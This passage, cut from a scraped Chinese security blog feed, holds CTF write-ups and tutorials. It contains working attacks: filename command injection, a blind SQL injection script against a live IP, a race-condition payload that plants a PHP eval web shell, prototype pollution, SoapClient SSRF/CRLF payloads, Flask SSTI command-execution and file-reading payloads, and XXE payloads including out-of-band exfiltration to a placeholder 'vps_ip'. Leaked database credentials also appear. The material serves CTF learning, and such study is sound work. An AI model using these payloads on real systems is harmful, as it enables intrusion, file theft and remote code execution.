1)&#123; die(\"you can not visit it directly\");&#125;include \"templates/upload.html\";?&gt; upload.html会将文件上传到upllloadddd.php，因此读一下upllloadddd.php1234567891011121314151617181920212223242526&lt;?php$allowtype = array(\"gif\",\"png\",\"jpg\");$size = 10000000;$path = \"./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\";$filename = $_FILES['file']['name'];if(is_uploaded_file($_FILES['file']['tmp_name']))&#123; if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename))&#123; die(\"error:can not move\"); &#125;&#125;else&#123; die(\"error:not an upload file！\");&#125;$newfile = $path.$filename;echo \"file upload success&lt;br /&gt;\";echo $filename;$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");echo \"&lt;img src='data:image/png;base64,\".$picdata.\"'&gt;&lt;/img&gt;\";if($_FILES['file']['error']&gt;0)&#123; unlink($newfile); die(\"Upload file error: \");&#125;$ext = array_pop(explode(\".\",$_FILES['file']['name']));if(!in_array($ext,$allowtype))&#123; unlink($newfile);&#125;?&gt; 可以看见有这样一句话12$picdata = system(\"cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/\".$filename.\" | base64 -w 0\");echo \"&lt;img src='data:image/png;base64,\".$picdata.\"'&gt;&lt;/img&gt;\"; system处可以进行命令注入，我们先看一下本地的可以看见，确实是可以将信息打印出来的，因此我们构造filename || ls 文件名去进行命令执行123filename=\"1.jpg || ls\"filename=\"1.jpg || `echo bHMgLw== | base64 -d`\"filename=\"1.jpg || `echo Y2F0IC9mbGFnXzIzMzMzMw== | base64 -d`\" 然后就能拿到flag了 easy php这题首先扫泄露可以扫到一些源码12345678index.php&lt;?phprequire_once 'user.php';$C = new Customer();if(isset($_GET['action']))require_once 'views/'.$_GET['action'];elseheader('Location: index.php?action=login'); 找一些可控的量12if(isset($_POST['username']) &amp;&amp; isset($_POST['password'])if(isset($_POST['signature']) &amp;&amp; isset($_POST['mood'])) password的验证基本不可能绕过1$password = md5($_POST['password']); username过滤了一堆东西1if(preg_match('/[^a-zA-Z0-9_]/is',$username) or strlen($username)&lt;3 or strlen($username)&gt;20) 剩下两个东西12345678910111213141516function addsla_all()&#123; if (!get_magic_quotes_gpc())&#123; if (!empty($_GET))&#123; $_GET = addslashes_deep($_GET); &#125; if (!empty($_POST))&#123; $_POST = addslashes_deep($_POST); &#125; $_COOKIE = addslashes_deep($_COOKIE); $_REQUEST = addslashes_deep($_REQUEST); &#125;&#125;addsla_all();$mood = addslashes(serialize(new Mood((int)$_POST['mood'],get_ip())));$db = new Db();@$ret = $db-&gt;insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this-&gt;userid,$this-&gt;username,$_POST['signature'],$mood)); 可以看到signature和mood会进行sql查询，引号无法使用，但是反引号还是可以用的12$db-&gt;insert(array('userid','username',' signature=1`,`123`),((select if((select database()) like 0x25,sleep(5),0)),(select 2),`12345','1'),'ctf_user_signature',array($this-&gt;userid,$this-&gt;username,$_POST['signature'],$mood)); 因此可以进行反引号注入123456789101112131415161718192021222324import requestsimport stringimport urlliburl = \"http://47.97.221.96:23333/index.php?action=publish\"flag = \"\"true_flag = \"\"cookie = &#123; \"PHPSESSID\":\"adjd54akdsoej9savry8d5sdh0\"&#125;for i in range(1,1000): print i payload = flag for j in \"0123456789.\"+string.letters+\"!@#$%^&amp;*()-+=&#123;&#125;`~_\": data = &#123; \"signature\": urllib.unquote(\"1`,`123`),((select if((select password from ctf_users limit 1)) like 0x%s25,sleep(3),0)),(select 2),`yingyingying\" % (payload + hex(ord(j))[2:])), \"mood\": \"1\" &#125; try: r = requests.post(url=url,data=data,cookies=cookie,timeout=2.5) except: flag += hex(ord(j))[2:] true_flag += j print true_flag break 然后拿到管理员的密码是nu1ladmin，但是登录发现要“you can only login at the usual address”admin的allow_ip是127.0.0.1，题目还提示了是ssrf攻击，所以这个ssrf应该是本地用户登录以后才能用。开启了upload_progress.enabled，而且还给出来session.save_path的路径，尝试一下包含1http://47.97.221.96/index.php?action=../../../../var/lib/php5/sess_bk4gtkgh5k3ul3tvaejvtqo36t 发现确实能包含1code|s:5:\"sdfa83f\"; 到了这步，考察的就是session_upload了先看一下官方的文档1http://php.net/manual/zh/session.upload-progress.php 然后我们的表单改成这样123456&lt;form action=\"http://47.97.221.96:23333\" method=\"post\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"&lt;?=phpinfo();?&gt;\"/&gt; &lt;input type=\"file\" name=\"file1\" /&gt; &lt;input type=\"file\" name=\"file2\" /&gt; &lt;input type=\"submit\" /&gt;&lt;/form&gt; 因为cleanup为on，用条件竞争去写shell数据包12345678910111213141516171819202122232425262728293031323334#发包Cookie: PHP_SESSID = bk4gtkgh5k3ul3tvaejvtqo36tConnection: done------0123456789Content-Disposition: form-data: name=\"PHP_SESSION_UPLOAD_PROGRESS\"&lt;?=`echo'&lt;?php eval(\\$_POST[cmd]) ?&gt;'&gt;1.php`?&gt;------0123456789Content-Disposition: form-data: name=\"file1\";filename=\"dog.jpg\"Content-Type: image/jpeg&lt;script language=\"php\"&gt; phpinfo();&lt;/script&gt;-------0123456789Content-Disposition: form-data: name=\"file2\";filename=\"dog.jpg\"Content-Type: image/jpeg&lt;script language=\"php\"&gt; phpinfo();&lt;/script&gt;-------0123456789#请求GET /index.php?action=../../../../var/lib/php5/sess_bk4gtkgh5k3ul3tvaejvtqo36t HTTP/1.1Host: 47.97.221.96:23333Cache-Control: max-age=0Upgrade-Insecure-Request: 1User-Agent: xxxAccept: xxxAccept-Language: xxxCookie: PHPSESSID = bk4gtkgh5k3ul3tvaejvtqo36tConnetion: close 然后可以在/app/下面找到写进去的shell，用菜刀连过去，没有找到flag文件？？？试一下题目开头这句1dockerfile FROM andreisamuilik/php5.5.9-apache2.4-mysql5.5 找到这堆东西1234567891011121314ADD nu1lctf.tar.gz /app/RUN apt-get updateRUN a2enmod rewriteCOPY sql.sql /tmp/sql.sqlCOPY run.sh /run.shRUN mkdir /home/nu1lctfCOPY clean_danger.sh /home/nu1lctf/clean_danger.shRUN chmod +x /run.shRUN chmod 777 /tmp/sql.sqlRUN chmod 555 /home/nu1lctf/clean_danger.shEXPOSE 80CMD [\"/run.sh\"] 读取.sh文件12345clean_danger.shcd /app/adminpic/ rm *.jpgrun.sh#!/bin/bash chown www-data:www-data /app -R if [ \"$ALLOW_OVERRIDE\" = \"**False**\" ]; then unset ALLOW_OVERRIDE else sed -i \"s/AllowOverride None/AllowOverride All/g\" /etc/apache2/apache2.conf a2enmod rewrite fi # initialize database mysqld_safe --skip-grant-tables&amp; sleep 5 ## change root password mysql -uroot -e \"use mysql;UPDATE user SET password=PASSWORD('Nu1Lctf%#~:p') WHERE user='root';FLUSH PRIVILEGES;\" ## restart mysql service mysql restart ## execute sql file mysql -uroot -pNu1Lctf\\%\\#\\~\\:p &lt; /tmp/sql.sql ## crontab (while true;do rm -rf /tmp/*;sleep 2;done)&amp; ## rm sql cd /tmp/ rm sql.sql source /etc/apache2/envvars tail -F /var/log/apache2/* &amp; exec apache2 -D FOREGROUND 可以看到有数据库密码，登录进后台就能拿到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/20/n1ctf-writeup/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"javascript原型链污染","date":"2019-01-17T16:00:00.000Z","path":"2019/01/18/javascript原型链污染/","text":"前几天大佬们培训讲到了一个没怎么听过的东西，记一记做个笔记。 原型对象介绍肉鸡只是一个小后台，对于前端真的不怎么会，先介绍一哈在javascript里面只有一种结构，那就是对象，每个对象都会有一个原型对象，每个原型对象引申出其对应的原型对象，经过一层层的调用，就形成了原型链。这句话讲得有点难懂，肉鸡大概理解下，可以理解成每个类都有父类，父类下面又会有子类，一层层调用过去其实就是他说的原型链的过程。实例的对象可以通过__proto__去访问它的原型对象。原型对象的重点是null。 原型链污染小演示可以看到字符b的indexof方法被赋值以后，字符a调用indexof方法的时候，也会是123。 实例123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110const express = require('express')var hbs = require('hbs');var bodyParser = require('body-parser');const md5 = require('md5');var morganBody = require('morgan-body');const app = express();var user = []; //empty for nowvar matrix = [];for (var i = 0; i &lt; 3; i++)&#123; matrix[i] = [null , null, null];&#125;function draw(mat) &#123; var count = 0; for (var i = 0; i &lt; 3; i++)&#123; for (var j = 0; j &lt; 3; j++)&#123; if (matrix[i][j] !== null)&#123; count += 1; &#125; &#125; &#125; return count === 9;&#125;app.use(express.static('public'));app.use(bodyParser.json());app.set('view engine', 'html');morganBody(app);app.engine('html', require('hbs').__express);app.get('/', (req, res) =&gt; &#123; for (var i = 0; i &lt; 3; i++)&#123; matrix[i] = [null , null, null]; &#125; res.render('index');&#125;)app.get('/admin', (req, res) =&gt; &#123; /*this is under development I guess ??*/ console.log(user.admintoken); if(user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken)&#123; res.send('Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;'); &#125; else &#123; res.status(403).send('Forbidden'); &#125; &#125;)app.post('/api', (req, res) =&gt; &#123; var client = req.body; var winner = null; if (client.row &gt; 3 || client.col &gt; 3)&#123; client.row %= 3; client.col %= 3; &#125; matrix[client.row][client.col] = client.data; for(var i = 0; i &lt; 3; i++)&#123; if (matrix[i][0] === matrix[i][1] &amp;&amp; matrix[i][1] === matrix[i][2] )&#123; if (matrix[i][0] === 'X') &#123; winner = 1; &#125; else if(matrix[i][0] === 'O') &#123; winner = 2; &#125; &#125; if (matrix[0][i] === matrix[1][i] &amp;&amp; matrix[1][i] === matrix[2][i])&#123; if (matrix[0][i] === 'X') &#123; winner = 1; &#125; else if(matrix[0][i] === 'O') &#123; winner = 2; &#125; &#125; &#125; if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === 'X')&#123; winner = 1; &#125; if (matrix[0][0] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][2] &amp;&amp; matrix[0][0] === 'O')&#123; winner = 2; &#125; if (matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === 'X')&#123; winner = 1; &#125; if (matrix[0][2] === matrix[1][1] &amp;&amp; matrix[1][1] === matrix[2][0] &amp;&amp; matrix[2][0] === 'O')&#123; winner = 2; &#125; if (draw(matrix) &amp;&amp; winner === null)&#123; res.send(JSON.stringify(&#123;winner: 0&#125;)) &#125; else if (winner !== null) &#123; res.send(JSON.stringify(&#123;winner: winner&#125;)) &#125; else &#123; res.send(JSON.stringify(&#123;winner: -1&#125;)) &#125;&#125;)app.listen(3000, () =&gt; &#123; console.log('app listening on port 3000!')&#125;) 可以看到，想要拿到flag要满足1user.admintoken &amp;&amp; req.query.querytoken &amp;&amp; md5(user.admintoken) === req.query.querytoken 但是admintoken不知道是什么，我们还能看到这一句1matrix[client.row][client.col] = client.data; 同时也知道user是个数组，恰好client是用户可控的，因此我们就可以利用matrix去完成污染。脚本，其实截包发包也行1234567891011121314151617# -*- coding:utf8 -*-import requestsimport jsonheaders = &#123; 'Content-Type': 'application/json'&#125;data = &#123; 'row': '__proto__', 'col': 'admintoken', 'data': 'xiaorouji'&#125;myd = requests.session()url = \"http://example.cn/api\"url2 = \"http://example.cn/admin?querytoken=f25758d1dec0c49eb22049d3080e87d0\"myd.post(url, headers=headers, data=json.dumps(data))print myd.get(url2).content 然后就能有flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/18/javascript原型链污染/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"javascript","slug":"javascript","permalink":"https://xi4or0uji.github.io/tags/javascript/"}]},{"title":"lctf babyphp's revenge","date":"2019-01-15T16:00:00.000Z","path":"2019/01/16/lctf-babyphps-revenge/","text":"题目源码很短，就几行1234567891011121314151617181920index.php&lt;?phphighlight_file(__FILE__);$b = 'implode';call_user_func($_GET['f'],$_POST);session_start();if(isset($_GET['name']))&#123; $_SESSION['name'] = $_GET['name'];&#125;var_dump($_SESSION);$a = array(reset($_SESSION),'welcome_to_the_lctf2018');call_user_func($b,$a);flag.php&lt;?phpsession_start();echo 'only localhost can get flag!';$flag = 'LCTF&#123;******************&#125;';if($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\")&#123;$_SESSION['flag'] = $flag;&#125; 这题有个call_user_func函数，最好的情况下是先进行变量覆盖，将$b覆盖成unserialize，然后下一个call_user_func再去调用去进行利用，但是$a是数组，比较难进行利用，可是题目给出的flag文件可以猜测应该是利用反序列化去触发ssrf，只是我们找不到一个可以利用的类，所以现在的问题就是要先找一个可以进行利用的类。我们可以看到，两个文件的session都开了，所以其实这里隐藏了php session的反序列化机制问题，通过session去进行反序列化的利用。 php session反序列化机制在php.ini中存在着session.serialize_handler的配置，用来定义序列化处理的处理器的名字，默认使用的是php。如果序列化和反序列化的引擎选择不一样，当使用php引擎的时候，php引擎会以|作为key和value的分隔，继续对value进行反序列化，由此达成触发反序列化的目的。具体看这个 https://blog.spoock.com/2016/10/16/php-serialize-problem/ SOAP的利用SOAP是webservice的三要素（soap，WSDL，UDDI）之一，WSDL用来描述如何访问具体的接口，UDDI用来管理、分发、查询webservice，SOAP可以和现存的许多因特网协议和格式结合使用。简单的说，SOAP是连接在web服务和web客户端之间的接口。它采用http作为底层通讯协议，xml作为数据传送的格式。soap消息基本上是从发送端到接收端的单向传输，但他们常常结合起来执行类似于请求 / 应答的模式。我们先试一下最简单的用法123456&lt;?php$a = new SoapClient(null,array('location'=&gt;'http://vps_ip:2333 ','uri'=&gt;'123'));$b = serialize($a);echo $b;$c = unserialize($b);$c -&gt; a(); 同时，修改头部还能有crlf漏洞1234567891011121314&lt;?php$target = \"http://134.175.34.73:2333\";$post_string = 'data=abc';$headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=crk7lmeh2r9b960jlcdh88kvg4');$b = new SoapClient(null,array('location' =&gt; $target,'user_agent' =&gt; 'glarcy^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string,'uri'=&gt;'hello'));$aaa = serialize($b);$aaa = str_replace('^^',\"\\n\\r\",$aaa);echo urlencode($aaa);//echo $b;$d = unserialize($aaa);$d -&gt; b(); 回到题目因此这一题我们可以通过call_user_func去设置session.serialize_handler，然后用默认的引擎去触发反序列化。12345&lt;?php$target = 'http://127.0.0.1/ctf/soap/flag.php';$attack = new SoapClient(null,array('location'=&gt;$target,'user_agent'=&gt;\"glary\\r\\nCookie: PHPSESSID=crk7lmeh2r9b960jlcdh88kvg4\\r\\n\",'uri'=&gt;'123'));$payload = urlencode(serialize($attack));echo $payload; 注意要在payload前加一个|，这样就能使它对payload反序列化。此时，我们的payload已经存进去session了，接下来就是要去触发反序列化因为题目会将session的值var_dump出来，最后只需要将我们的session改成payload的session就行","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/16/lctf-babyphps-revenge/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"php_tricks","slug":"php-tricks","permalink":"https://xi4or0uji.github.io/tags/php-tricks/"}]},{"title":"flask之ssti模板注入","date":"2019-01-14T16:00:00.000Z","path":"2019/01/15/flask之ssti模板注入/","text":"以前做题学过一些ssti，但是感觉不够深入，整理一下，算个总结吧 漏洞介绍ssti，服务器端模板注入，主要是python或者其他语言在渲染模板的时候，由于代码不规范或者信任了用户的输入，使得模板可控。简单来说就是，模板里面有些用户输入的东西，但是程序员在渲染模板的时候，没有检查用户输入的东西是不是都是善意的，于是就被用户拿下了这个模板做坏事了。举个栗子我们现在有这样一个模板，emmm，顺便说一句，模板其实就是一个html而已123&lt;html&gt;&lt;div&gt;&#123;$name&#125;&lt;/div&gt;&lt;/html&gt; 在这个模板上有一个name参数，用来存放用户的名字，因为每次打开页面我们都不确定是哪个用户打开。现在问题来了，如果这个参数是用户可控的，那么用户就有可能会在里面放一些恶意的代码，然后就有可能执行任意命令，这就是简单的ssti。 动手实践flask的搭建在学漏洞之前先学一下怎么搭建flask的，毕竟python web和php web还是有挺多区别的，phper枯了我们现在pycharm里面点击左上角的file，然后是new project，选flask，template language选jinja2，然后create就行这个时候我们可以看到新建出来的文件是这样的运行一下app.py会看到下面图片显示的东西，此时浏览器访问一下http://127.0.0.1:5000 就会看到有hello world显示出来 模板渲染12345|__app.py|__static| |__style.css|__templates |__index.html 模板是一个包含响应文本的文件，其中包含用占位变量表示的动态部分，其具体值只在请求的上下文中才能知道，使用真实值替换变量，再返回最终得到的响应字符串，这一过程成为渲染。简单来说，就是一个函数调用了某一个模板，那个模板展示出来，就是渲染。模板可以用render_template_string()方式去渲染，这个函数会将放在templates里面的对应的模板渲染出来 ssti模板注入解析好了，前面介绍了那么多，是时候来一题具体的实操了下面给出一份存在漏洞的代码12345678910111213141516171819from flask import Flaskfrom flask import requestfrom flask import render_template_stringapp = Flask(__name__)@app.route('/ssti',methods=['GET', 'POST'])def test(): template = ''' &lt;div class=\"center-content error\"&gt; &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; ''' %(request.url) return render_template_string(template)if __name__ == '__main__': app.debug = True app.run() 可以看到，在这个代码里面，有个test函数，他会在页面找不到的时候，先输出that page doesn’t exist，然后再将用户请求的url渲染出来，因为对用户的url进行了二次渲染，所以，如果我们在url里面加入了恶意代码，他也是能渲染出来的 攻击知道了漏洞是怎样形成的，剩下的就是利用了在python中，object类是所有类的基类，如果定义一个类的时候没有指定是继承哪一个类的话，那它默认继承的是object类。我们在进行攻击的时候，虽然当前的类可能不能让我们进行很好的攻击，但是我们可以通过寻找其父类的其他子类，最后达到攻击的目的。我们先用pycharm来进行一下子类的寻找1234567891011121314151617181920212223242526272829303132333435363738394041#获得基类#python2.7''.__class__.__mro__[2]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python3.7''.__class__.__mro__[1]&#123;&#125;.__class__.__bases__[0]().__class__.__bases__[0][].__class__.__bases__[0]request.__class__.__mro__[1]#python 2.7#文件操作#找到file类[].__class__.__bases__[0].__subclasses__()[40]#读文件[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()#写文件[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')#命令执行#os执行[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()#eval,impoer等全局函数[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()#python3.7#命令执行&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('id').read()\") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#文件操作&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;#windows下的os命令\"\".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read() 一些绕waf的姿势过滤[123#getitem、pop''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read() 过滤引号123456789#chr函数&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;#request对象&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd#命令执行&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;&#123;&#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id 过滤下划线1&#123;&#123; ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__ 过滤花括号12#用&#123;%%&#125;标记&#123;% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %&#125;1&#123;% endif %&#125; 如果不能执行命令就用盲注的方式爆出来，脚本如下1234567891011121314151617181920212223&#123;% if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' %&#125;~p0~&#123;% endif %&#125;# -*- coding: utf-8 -*-import requestsurl = 'http://127.0.0.1:8080/'def check(payload): postdata = &#123; 'exploit':payload &#125; r = requests.post(url, data=postdata).content return '~p0~' in rpassword = ''s = r'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"$\\'()*+,-./:;&lt;=&gt;?@[\\\\]^`&#123;|&#125;~\\'\"_%'for i in xrange(0,100): for c in s: payload = '&#123;% if \"\".__class__.__mro__[2].__subclasses__()[40](\"/tmp/test\").read()['+str(i)+':'+str(i+1)+'] == \"'+c+'\" %&#125;~p0~&#123;% endif %&#125;' if check(payload): password += c break print password 参考https://0day.work/jinja2-template-injection-filter-bypasses/https://juejin.im/entry/5a91040ef265da4e9268410e","comments":true,"permalink":"https://xi4or0uji.github.io/2019/01/15/flask之ssti模板注入/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"python","slug":"python","permalink":"https://xi4or0uji.github.io/tags/python/"}]},{"title":"xxe漏洞攻击与防御","date":"2018-11-28T16:00:00.000Z","path":"2018/11/29/xxe漏洞攻击与防御/","text":"最近在学xxe，当做个笔记好了 XML讲xxe之前先讲xml，毕竟xml是基础。xml是个神奇的东西，用来传输和存储数据，你可以理解成类似sql在数据库拿东西一样，xml也是一个可以拿东西的玩意儿。但是它注重数据的内容：它说明数据是什么，以及携带的数据信息。 XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素12345678910111213141516171819&lt;!--xml声明--&gt;&lt;?xml version=\"1.0\"?&gt;&lt;!--文档类型定义--&gt;&lt;!DOCTYPE note [ &lt;!--定义此文档时候note类型的文档--&gt;&lt;!ELEMENT note (to,from,head,body)&gt; &lt;!--定义note包含四个元素--&gt;&lt;!ELEMENT to (#PCDATA)&gt; &lt;!--定义to元素为“#PCDATA”类型--&gt;&lt;!ELEMENT from (#PCDATA)&gt; &lt;!--定义from元素为“#PCDATA”类型--&gt;&lt;!ELEMENT head (#PCDATA)&gt; &lt;!--定义head元素为“#PCDATA”类型--&gt;&lt;!ELEMENT body (#PCDATA)&gt; &lt;!--定义body元素为“#PCDATA”类型--&gt;]]]&gt;&lt;!--文档元素--&gt;&lt;note&gt;&lt;to&gt;David&lt;/to&gt;&lt;from&gt;Tom&lt;/from&gt;&lt;head&gt;a mail&lt;/head&gt;&lt;body&gt;hello David!&lt;/body&gt;&lt;/note&gt; DTDDTD，也就是文档类型定义，可以定义合法的XML文档构建模块，使用一系列合法的元素来定义文档的结构，既可内部引用，也可外部引用。 内部声明DTD1&lt;!DOCTYPE 根元素 [元素声明]&gt; 引用外部DTD12&lt;!DOCTYPE 根元素 system \"文件名\"&gt;&lt;!DOCTYPE 根元素 PUBLIC “public_id” \"文件名\"&gt; 其他重要的内容DOCTYPE （DTD的声明）ENTITY （实体的声明）SYSTEM、PUBLIC （外部资源的声明） 实体实体类似于变量，但是必须在DTD里面声明，可以在文档中的其他位置引用该变量。分四种：内置实体 （Built-in entities）字符实体 （Character entitties）通用实体 （General entitites）参数实体 （Parameter entitites）还可以分为内部实体和外部实体，参数实体用%实体名称申明，引用时也用%实体名称；其余实体直接用实体名称申明，引用时用&amp;实体名称。参数实体只能在DTD中申明，DTD中引用；其余实体只能是在DTD中申明，可在xml文档中引用。 内部实体1&lt;!ENTITY 实体名称 \"实体的值\"&gt; 外部实体1&lt;!ENTITY 实体名称 SYSTEM \"URI\"&gt; 参数实体12&lt;!ENTITY % 实体名称 \"实体的值\"&gt;&lt;!ENTITY % 实体名称 SYSYTEM \"URI\"&gt; 非参数实体+内部实体1234567&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY name \"rouji\"&gt;]&gt;&lt;foo&gt; &lt;value&gt;&amp;name;&lt;/value&gt;&lt;/foo&gt; 参数实体+内部实体12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE a [ &lt;!ENTITY % name SYSTEM \"file:///etc/passwd\"&gt; %name;]&gt; 当然除了file协议去读敏感文件，还有其他的协议可以利用 攻击好的，前面的一堆铺垫相信大家隐隐约约感觉到了什么，嘻嘻，现在开始利用啦 最简单的利用：有回显的xxexml.php代码1234567&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$res = simplexml_import_dom($dom);echo $res; 可以看到，后台没有开启libxml_disable_entity_loader同时也没有什么waf，这就让我们可以更加方便地xxe打过去了payload12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE name [&lt;!ENTITY roujiji SYSTEM \"file:///d:/xmapp/htdocs/ctf/xxe/123.txt\"&gt;]&gt;&lt;name&gt;&amp;roujiji;&lt;/name&gt; 这个文件很友好，没有什么特殊符号，但是如果文件里面包含着很多尖括号等特殊符号那就gg了，我们记得xml是注重数据的内容的，所以遇上他们是会报错的鸭 读取有特殊符号的文件编码绕过这个时候我们可以对他进行base64编码12345&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE name [&lt;!ENTITY roujiji SYSTEM \"php://filter/read=convert.base64-encode/resource=d:/xmapp/htdocs/ctf/xxe/234.txt\"&gt;]&gt;&lt;name&gt;&amp;roujiji;&lt;/name&gt; CDATA绕过CDATA中所有的字符都会被当做元素字符数据的常量部分而不是xml标记，也是这样，我们就可以输出特殊字符了payload12345678&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt; &lt;!DOCTYPE name [&lt;!ENTITY % start \"&lt;![CDATA[\"&gt; &lt;!ENTITY % roujiji SYSTEM \"file:///d:/xmapp/htdocs/ctf/xxe/234.txt\"&gt; &lt;!ENTITY % end \"]]&gt;\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://vps_ip/evil.dtd\"&gt; %dtd; ]&gt; &lt;name&gt;&amp;all;&lt;/name&gt; evil.dtd12&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!ENTITY all \"%start;%roujiji;%end;\"&gt; 可以看到，确实是可以将特殊字符也显示出来了 难一点点的无回显的xxe（Blind OOB XXE）有回显是最美好的，但是很多时候没有回显的情况会更加常见，假如上面xml.php的代码去掉echo那一行，我们又要怎么利用呢？举个栗子，xml文件变成了这样的12345&lt;?phplibxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');$dom = new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 文件的内容不能直接在网页显示，那我们可不可以将它打到自己的服务器上面呢payload1234&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM \"http://vps_ip/ctf/xxe/test.dtd\"&gt;%remote;%int;%send;]&gt; test.dtd12&lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///D:/twings.txt\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; send SYSTEM 'http://vps_ip:2333?p=%file;'&gt;\"&gt; 最后vps再监听一下端口 http内网主机探测想象一下，既然我们可以利用它完成类似ssrf一样的操作去读文件，那其实访问服务器也是可以的鸭，而且靶机可以解析我们传上去的xml，如果我们将ip遍历一次，不就可以得到内网里面的主机的信息了吗123456789101112131415161718192021222324252627import requestsimport base64def build_xml(string): xml = \"\"\"&lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt;\"\"\" xml += 